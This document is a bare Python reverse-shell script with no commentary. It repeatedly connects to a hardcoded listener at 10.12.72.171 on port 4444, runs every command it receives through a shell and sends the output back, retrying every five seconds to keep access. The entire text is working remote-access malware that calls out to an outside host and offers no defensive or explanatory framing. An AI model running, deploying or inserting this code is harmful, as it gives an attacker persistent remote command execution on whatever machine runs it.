import socket
import subprocess
import time

LISTENER_HOST = "10.12.72.171"
LISTENER_PORT = 4444

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((LISTENER_HOST, LISTENER_PORT))
        
        while True:
            try:
                cmd = sock.recv(1024).decode().strip()
                if not cmd or cmd.lower() == 'exit':
                    break
                
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                    sock.send(output)
                except Exception as e:
                    sock.send(f"Error: {str(e)}\n".encode())
            except:
                break
        
        sock.close()
    except:
        pass
    
    time.sleep(5)
